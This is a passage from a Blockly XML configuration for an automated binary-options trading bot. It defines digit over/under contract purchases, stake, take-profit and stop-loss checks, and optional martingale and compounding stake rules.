Trading"></mutation>\n                                                        <data>:Tq]VUlM=BJk#=;.3aYU</data>\n                                                        <next>\n                                                          <block type="variables_set" id="04?NsjPy@EcVaNBFvS~q" collapsed="true">\n                                                            <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                                                            <value name="VALUE">\n                                                              <block type="variables_get" id="x|YP+!A%~5?j+94P(AuL">\n                                                                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                                              </block>\n                                                            </value>\n                                                            <next>\n                                                              <block type="variables_set" id=",N%:N5HXk:D9]dYCQJ-N" collapsed="true">\n                                                                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                                                                <value name="VALUE">\n                                                                  <block type="math_number" id="%dG/.3}`9pxjxDYvt3t$">\n                                                                    <field name="NUM">0</field>\n                                                                  </block>\n                                                                </value>\n                                                              </block>\n                                                            </next>\n                                                          </block>\n                                                        </next>\n                                                      </block>\n                                                    </next>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="controls_if" id="anmDpxw5Adhq9v~h]Awq">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="b8o))xezc!K1;?$UIb2$">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="Ij=X5uP[Ioqg61An4!x*">\n                <field name="VAR" id="kv1LrCbomC4@7:M/d%?0" variabletype="">Use Contract Type Switcher</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="logic_boolean" id="`@^14BdMpg~Q?vvHO^,v">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="4yuK|P)X[jgCh+,5iS,#">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="jj7?J?-_ya[J9E,+#%Cc">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="KzAX8!g|YUmkj_wV3w0o">\n                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="text" id="[y5t1B%WCT58;li9$q)|">\n                    <field name="TEXT">Under</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="trade_definition_tradeoptions" id="WeNX1fen.XO?FdRLm_m^">\n                <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n                <field name="DURATIONTYPE_LIST">t</field>\n                <value name="DURATION">\n                  <shadow type="math_number_positive" id="},}3yJ69-J-gHxwa*8N:">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <value name="AMOUNT">\n                  <shadow type="math_number_positive" id="f;YaY;efEV^HkE4fJgY/">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="#=u;*~XqDVf(6j+LY9ZD">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                  </block>\n                </value>\n                <value name="PREDICTION">\n                  <shadow type="math_number_positive" id="N8OI5PYH(J*1nR2$[}g?">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="math_number" id=":#),L7:nJWVfkXw;?Py:">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="trade_definition_tradeoptions" id=")2;2*D/$2pgX[q!*kxgp">\n                <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n                <field name="DURATIONTYPE_LIST">t</field>\n                <value name="DURATION">\n                  <shadow type="math_number_positive" id=":D]*%PuYHSi,!G?lp.GK">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <value name="AMOUNT">\n                  <shadow type="math_number_positive" id="DR$FNlbO~7jun|dy*5C1">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="yps9ix^qx%0T]|pcs668">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                  </block>\n                </value>\n                <value name="PREDICTION">\n                  <shadow type="math_number_positive" id="7rcwrmc%@CXM;,iMKa1X">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="math_number" id=",BH2l#9FN8I/f9TWD]0b">\n                    <field name="NUM">8</field>\n                  </block>\n                </value>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="trade_definition_tradeoptions" id="@e5eu8)vsyZoeZ9bq:l2">\n            <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n            <field name="DURATIONTYPE_LIST">t</field>\n            <value name="DURATION">\n              <shadow type="math_number_positive" id="[-?H:mw.%kyE)RM_35B`">\n                <field name="NUM">1</field>\n              </shadow>\n            </value>\n            <value name="AMOUNT">\n              <shadow type="math_number_positive" id="_w)Jiyc[;bSK9s:AK$5d">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="U6xds)Q]hxNbdDih)t-:">\n                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n              </block>\n            </value>\n            <value name="PREDICTION">\n              <shadow type="math_number_positive" id="W./L4IUdY[*B]P7DZ;1p">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="math_number" id="ba(2GiG-zSKHnSeqJE%I">\n                <field name="NUM">5</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="N|p|#TF(n)T5q(2;:E_L" collapsed="true" x="906" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="z;c[K$OpqdAjU*wCLl*9">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="NHjJbm[Cijv~Ley/ZvIr">\n            <field name="OP">GTE</field>\n            <value name="A">\n              <block type="total_profit" id="mmY6mRJMyW:XJT7y-BUk"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="Qu^BJ/f~0@mXd]Vf[#2w">\n                <field name="VAR" id="iexW!(p-QSL[kDvWK`o-" variabletype="">Take Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_print" id="N(zlzQ$brWJvN0,0xxB5">\n            <value name="TEXT">\n              <shadow type="text" id="@eqR_i-,.3g]~5e/`t~F">\n                <field name="TEXT">Take Profit Hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="gU^da0)!38=fPrv[Rz3T">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="#Ns63Q/r5HW*!La^07U-"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="y)htA1wy)WnQ,7:f(MkN">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="z8}-_]UDkc8rkuzJ(ckC">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="[F8%a@pBeA2Ks[Q=.Vik">\n                    <field name="VAR" id="AwGIX3K`=6@AOl/-`G)O" variabletype="">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="5|so};ejYw%-A{s=d5;Q">\n            <value name="TEXT">\n              <shadow type="text" id=")01HACF%x-bW*#tiNBaS">\n                <field name="TEXT">Sorry Stop Loss Hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="(~~!1CBdadAhV8aPYMI0">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="RQXD%_pE6|`{LQdh#sXt">\n                <field name="CHECK_RESULT">loss</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="math_change" id="8+LGRJh_7??B,ycgpM-=">\n                <field name="VAR" id="S58/v7q-;.szsCzu^Vvo" variabletype="">Total Lost</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="N:^Y(R!:H2BUko9#+L!.">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="_w1`O_m-!FO,th}!`Tk+">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="controls_if" id="g3D*ZK)yii:1!T[jqW,,">\n                    <value name="IF0">\n                      <block type="logic_compare" id="w;jD5B=CTzXEAdL7Y))4">\n                        <field name="OP">GT</field>\n                        <value name="A">\n                          <block type="variables_get" id="#R/D_bTkiLX|8y7tn8oy">\n                            <field name="VAR" id="ITcU7:kSbe)cNBWn8K#R" variabletype="">Count Loss</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="PEy#$B72?uNeWq[?SRZ~">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="@Y2rDrAD$,ua`XN(hlbK">\n                        <field name="VAR" id="ITcU7:kSbe)cNBWn8K#R" variabletype="">Count Loss</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="$*K),ey7WpeU7D:*]{$^">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="math_change" id="-c`:6Iul#E8:+:8@Uro0">\n                <field name="VAR" id="S58/v7q-;.szsCzu^Vvo" variabletype="">Total Lost</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="%3EGDxH%yE`/UDX3jA:q">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="math_single" id="WyP5s|/~n:H2cbMOI3C[">\n                    <field name="OP">NEG</field>\n                    <value name="NUM">\n                      <shadow type="math_number" id="ef)EXL3dQd}aLC3vXfSQ">\n                        <field name="NUM">9</field>\n                      </shadow>\n                      <block type="read_details" id="V/Y2G:Jua*,d~|pS|v.1">\n                        <field name="DETAIL_INDEX">4</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <next>\n                  <block type="controls_if" id="?[iY/?,R3np9i$BA,?cc">\n                    <value name="IF0">\n                      <block type="logic_compare" id="WbsL,sipS3NcebfSb5H5">\n                        <field name="OP">LT</field>\n                        <value name="A">\n                          <block type="variables_get" id="t.]39?/C6(:ssdFwZEFf">\n                            <field name="VAR" id="S58/v7q-;.szsCzu^Vvo" variabletype="">Total Lost</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="~(59i|2.:.Bgd%(A=XEO">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="ywUtL(3TC.AP+thA4.[G">\n                        <field name="VAR" id="S58/v7q-;.szsCzu^Vvo" variabletype="">Total Lost</field>\n                        <value name="VALUE">\n                          <block type="math_number" id=";gWc-)DiB?[Jfk*B~Zui">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="C1?A_[R3*Kl^WLI,1?^A">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="iu(-SS_I6AHr!(~}$8X5">\n                    <field name="OP">GT</field>\n                    <value name="A">\n                      <block type="variables_get" id="BX56JT|Egh$mn4,`}rU@">\n                        <field name="VAR" id="S58/v7q-;.szsCzu^Vvo" variabletype="">Total Lost</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="`$JoR=]}]@3%=MsS3-FB">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="math_change" id="Lg[tOjG^tAfFp?+(:oIg">\n                    <field name="VAR" id="ITcU7:kSbe)cNBWn8K#R" variabletype="">Count Loss</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id="b*(2llW5v@Y4ICfTVV/b">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="controls_if" id="Q)]gvtEm_H(b77_tHN!i">\n                        <value name="IF0">\n                          <block type="logic_compare" id="xR,!|~tLT0mB_Slgj2|p">\n                            <field name="OP">EQ</field>\n                            <value name="A">\n                              <block type="variables_get" id="!gz^JBj@-)3jK*[Qm6MN">\n                                <field name="VAR" id="ITcU7:kSbe)cNBWn8K#R" variabletype="">Count Loss</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="math_number" id="2)~R17Gm/-bALbH@*zMZ">\n                                <field name="NUM">1</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <statement name="DO0">\n                          <block type="controls_if" id="+?8Z.DfA=Zet`YxX%8si">\n                            <mutation else="1"></mutation>\n                            <value name="IF0">\n                              <block type="logic_compare" id="@b50qr+`dDSTwoa_IiU$">\n                                <field name="OP">EQ</field>\n                                <value name="A">\n                                  <block type="variables_get" id="j$X0.fVQu`k{T#M#NV8I">\n                                    <field name="VAR" id="_$b#PTe$SH2iW}Unna2W" variabletype="">Use Martingale</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="logic_boolean" id="zq+?6}?-v},jig5LeUqv">\n                                    <field name="BOOL">TRUE</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="hpGUBN@n:%puMqtwr^^=">\n                                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                <value name="VALUE">\n                                  <block type="math_arithmetic" id="nzFm#pl|oPomufNf*R.s">\n                                    <field name="OP">DIVIDE</field>\n                                    <value name="A">\n                                      <shadow type="math_number" id="}=[ohM(;0eA_PxHbh.Em">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="math_arithmetic" id="}sk@_ouH)[3;j?BLBb7b">\n                                        <field name="OP">MULTIPLY</field>\n                                        <value name="A">\n                                          <shadow type="math_number" id="sAa/m#%`t/-:kVi9US8g">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="variables_get" id="7^v$f#:k9p+Jd!!pLVmr">\n                                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                          </block>\n                                        </value>\n                                        <value name="B">\n                                          <shadow type="math_number" id="ew#0r(._R^PpJ27dlBJr">\n                                            <field name="NUM">2</field>\n                                          </shadow>\n                                          <block type="variables_get" id="b7$Pw$~A(vYSJ?Q3*;HM">\n                                            <field name="VAR" id="Z@.ow_sBjxwtbL$F52.u" variabletype="">Martingale</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow type="math_number" id="_?w2wi`oK5mIE-r~*VrK">\n                                        <field name="NUM">2</field>\n                                      </shadow>\n                                      <block type="variables_get" id="[!JS7yU(wqJbQsfc~YpL">\n                                        <field name="VAR" id="l~5h|:Ld!GjDd-Ed4c|j" variabletype="">Split Martingale</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="controls_if" id="q/l)e1828LwHY+?miGnw">\n                                    <value name="IF0">\n                                      <block type="logic_compare" id="k.t$U1(4vDN`OM$S@]zy">\n                                        <field name="OP">LT</field>\n                                        <value name="A">\n                                          <block type="variables_get" id="d%78J|,[SWu:D$RC/C7o">\n                                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                          </block>\n                                        </value>\n                                        <value name="B">\n                                          <block type="math_number" id="QBO{/`TN~_^9FC$8DV%:">\n                                            <field name="NUM">0.35</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                    <statement name="DO0">\n                                      <block type="variables_set" id="8I,=aW/m2#9c0:uty25E">\n                                        <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                        <value name="VALUE">\n                                          <block type="math_number" id="{%J:Fv7}CE(oFrU;`/Pj">\n                                            <field name="NUM">0.35</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </statement>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                            <statement name="ELSE">\n                              <block type="variables_set" id="=k*Rc`VF=muad@A{I(_F">\n                                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="wucnM!}{i+P:SW(}shM~">\n                                    <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                            <next>\n                              <block type="controls_if" id="o|jX{~Eewc,8$1!Q2bI~" collapsed="true">\n                                <mutation else="1"></mutation>\n                                <value name="IF0">\n                                  <block type="logic_compare" id="|TkJ=fMG6*@}u`(Vk/xc">\n                                    <field name="OP">NEQ</field>\n                                    <value name="A">\n                                      <block type="variables_get" id="7DCTyU[Xp7}rg/@]SD+4">\n                                        <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <block type="text" id="!30LlaXe~p+lk:yoWR@i">\n                                        <field name="TEXT">Under</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                                <statement name="DO0">\n                                  <block type="variables_set" id="8j30Yjg)pH[{R?;lc%oX">\n                                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                    <value name="VALUE">\n                                      <block type="text" id="vf/U6aYNV7.9^-;lZdz_">\n                                        <field name="TEXT">Under</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </statement>\n                                <statement name="ELSE">\n                                  <block type="variables_set" id="%A[4_:[?BY-[{uREeITg">\n                                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                    <value name="VALUE">\n                                      <block type="text" id="(*zGS[vH7g8NA1W0ByeS">\n                                        <field name="TEXT">Over</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </statement>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id="myb^)ZZ,igr9f$)syMBL">\n                    <field name="VAR" id="ITcU7:kSbe)cNBWn8K#R" variabletype="">Count Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="O1VkbEA,ZTug2mPr=/jB">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="controls_if" id="Q]sDr;9JG{H)-ToA^qY~">\n                        <mutation else="1"></mutation>\n                        <value name="IF0">\n                          <block type="logic_compare" id="Otu})/^2I447Lz#Gl!@x">\n                            <field name="OP">EQ</field>\n                            <value name="A">\n                              <block type="variables_get" id="vq/fe]aLJ?~c$iTVGk:C">\n                                <field name="VAR" id="XfX?ed24Y,S7*f=/-sQ9" variabletype="">Use Compounding Stake</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="logic_boolean" id="Os;:HiTE!t[W+95efnm8">\n                                <field name="BOOL">TRUE</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <statement name="DO0">\n                          <block type="variables_set" id="7e?n4,h^^XpkHK2*~qys">\n                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                            <value name="VALUE">\n                              <block type="math_arithmetic" id="+lEu!Mk(/aY$$3]R,T`K">\n                                <field name="OP">ADD</field>\n                                <value name="A">\n                                  <shadow type="math_number" id="8LRw%u*$6]uTRIx-_v6Q">\n                                    <field name="NUM">1</field>\n                                  </shadow>\n                                  <block type="variables_get" id="Lp/b}~57af;EnN3#q03`">\n                                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <shadow type="math_number" id="R{jE2;vqUWD~Q.%.U6uW">\n                                    <field name="NUM">1</field>\n                                  </shadow>\n                                  <block type="read_details" id="-Qmkyk)(J?GgEH|M!!q1">\n                                    <field name="DETAIL_INDEX">4</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                          </block>\n                        </statement>\n                        <statement name="ELSE">\n                          <block type="variables_set" id=":d=G)ngwmIw:im?a~_j?">\n                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="WuZqGT[Un!|3spaue(6r">\n                                <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                              </block>\n                            </value>\n                          </block>\n                        </statement>\n                        <next>\n                          <block type="controls_if" id="@rfrF2-psqAhW^bk8_;D" collapsed="true">\n                            <mutation else="1"></mutation>\n                            <value name="IF0">\n                              <block type="logic_compare" id="X;]3F7fVh`6D7lU]6u;@">\n                                <field name="OP">NEQ</field>\n                                <value name="A">\n                                  <block type="variables_get" id="DR(E(dnTn6nK:5c+i7z-">\n                                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="text" id="QNfQ[Q%nQ%S,`$m@muvk">\n                                    <field name="TEXT">Under</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="+@MO9hFQx!o1VDN4x;h%">\n                                <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                <value name="VALUE">\n                                  <block type="text" id="Oo4A!7W6R3!/G(ITbnlk">\n                                    <field name="TEXT">Under</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                            <statement name="ELSE">\n                              <block type="variables_set" id="z:Yh7)}r3^]*cupO;ss^">\n                                <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                <value name="VALUE">\n                                  <block type="text" id="1.I.p7Mkd}vD0W#eY[z1">\n                                    <field name="TEXT">Over</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="controls_if" id="P*2G/7pG)[`#SyTacp:J">\n                    <mutation elseif="1" else="1"></mutation>\n                    <value name="IF0">\n                      <block type="logic_operation" id="=@1,Y?Y/JAVi(p{VB$OM">\n                        <field name="OP">AND</field>\n                        <value name="A">\n                          <block type="contract_check_result" id="XD?S5~IBQc.bq@w%oO/)">\n                            <field name="CHECK_RESULT">loss</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="logic_compare" id="4-UTD+52:UqjiP[c7$0_">\n                            <field name="OP">EQ</field>\n                            <value name="A">\n                              <block type="variables_get" id="ev%F9Rc{7C4AfAQA0,Uz">\n                                <field name="VAR" id="EyYZFSoOM?_MS_~x:Z^(" variabletype="">Stop Trading on loss</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="logic_boolean" id="s{I{CZMdhvDcgB]S{Sk4">\n                                <field name="BOOL">TRUE</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="text_print" id="()KQ|q%LWOY^#4g@iJeE">\n                        <value name="TEXT">\n                          <shadow type="text" id="WE[z5IH1aLRIlIJrGX{P">\n                            <field name="TEXT">Sorry Bot Stopped After Loss</field>\n                          </shadow>\n                        </value>\n                      </block>\n                    </statement>\n                    <value name="IF1">\n                      <block type="logic_operation" id="YWcR/)!4.G{8`pOVO:,B">\n                        <field name="OP">AND</field>\n                        <value name="A">\n                          <block type="contract_check_result" id="-Rt6U:%!B!;d1gPOcZ2.">\n                            <field name="CHECK_RESULT">win</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="logic_compare" id="J(_rV]j$,?_`aFZ7nxIK">\n                            <field name="OP">GTE</field>\n                            <value name="A">\n                              <block type="total_runs" id="#Th68@lC4BC?ZaA9qYa-"></block>\n                            </value>\n                            <value name="B">\n                              <block type="variables_get" id="nkk#!9O{f3StWbhJOuUU">\n                                <field name="VAR" id="tpKgmnH0mz*.t/T=*i|V" variabletype="">Maximum Runs</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO1">\n                      <block type="text_print" id="8UU,gOiZQ]@Jel)ujU)i" collapsed="true">\n                        <value name="TEXT">\n                          <shadow type="text" id="%gcuk7CSH/#@?{z5t5P{">\n                            <field name="TEXT">Maximum Run Hit!!!  ||  Don\'t Over Trade. Stupid</field>\n                          </shadow>\n                        </value>\n                      </block>\n                    </statement>\n                    <statement name="ELSE">\n                      <block type="trade_again" id="i:whR5o)${ZEhJ;*aB^d"></block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="V/jf;#b@;*@3ATM]D)=;" deletable="false" x="0" y="1716">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="d#p~s(E*5}-6=QaY`?:G">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="f5^qfH3pKTK9}bd`+Mo.">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="/Zy[qIJCQ62Ao`65{?,S">\n                <field name="VAR" id="kv1LrCbomC4@7:M/d%?0" variabletype="">Use Contract Type Switcher</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="logic_boolean" id="D2x5`zt^o9U`.b}mvB,L">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="42TJOh33!rm$JB,Q#Gc+">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="TioHx0i*W%iT#d;g4]mz">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="XU#u@(wT8!C?9C;Dj@3I">\n                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="text" id="zmLNtl0?@GHLlKLthUTc">\n                    <field name="TEXT">Under</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id="ZIu(a,2Hj/!q4UzZ%=8_">\n                <field name="PURCHASE_LIST">DIGITOVER</field>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="apollo_purchase" id="[F#9crrE!=NVe:)1)dZL">\n                <field name="PURCHASE_LIST">DIGITUNDER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="apollo_purchase" id="9vaDTc^2,6Wg-(ekpX.$">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n        <next>\n          <block type="procedures_callnoreturn" id="W]/99p4AY6,$8SPFGlj@">\n            <mutation name="Switch Markets"></mutation>\n            <data>FrhP.v@2:JZ=^x?jnS$%</data>\n            <next>\n              <block type="text_join" id="D={8du*d/_2-6kHbCktj" collapsed="true">\n                <field name="VARIABLE" id="Qq28jzu{61V^?3_DKY1z" variabletype="">text</field>\n                <statement name="STACK">\n                  <block type="text_statement" id="[T:T(wc/J!yu,^99{.hB">\n                    <value name="TEXT">\n                      <shadow type="text" id="t5L]]NVSx!UgB8Fql_@#">\n                        <field name="TEXT">Entry Point: </field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="Z*_3,y[9+[CCCXM7f9UY">\n                        <value name="TEXT">\n                          <shadow type="text" id="Bi68;O7h4u%iSSNm]`Ak">\n                            <field name="TEXT"></field>\n                          </shadow>\n                          <block type="variables_get" id="m0p.oR_e-hkjyugJJw._">\n                            <field name="VAR" id="}4sS3G-ig-*lgLxN.HK~" variabletype="">Entry Point</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="text_statement" id="mr4N-tHpNGkAZ(f:zZ;!">\n                            <value name="TEXT">\n                              <shadow type="text" id=";:|~IbP#!TbXSbFE^|iD">\n                                <field name="TEXT">{</field>\n                              </shadow>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="HN*sLdw}#)(t#cZ;jFAH">\n                                <value name="TEXT">\n                                  <shadow type="text" id="}9ulm=y607lniFm]OTG2">\n                                    <field name="TEXT"></field>\n                                  </shadow>\n                                  <block type="last_digit" id="0!/zDZx?Xq@o{EHs`?v1"></block>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="uh3w_8kaSn)P4h!v1dG_">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="PyqLSP]-(g,T*4yw/vtS">\n                                        <field name="TEXT">}</field>\n                                      </shadow>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="btnotify" id="497Bq58BVf9+Zlb.xcYL" collapsed="true">\n                    <field name="NOTIFICATION_TYPE">success</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <shadow type="text" id="/sPTQBozr114}mtSN*9I">\n                        <field name="TEXT">PrimeTrades</field>\n                      </shadow>\n                      <block type="variables_get" id="s7Xq7nGw{OyA1)tD`x2q">\n                        <field 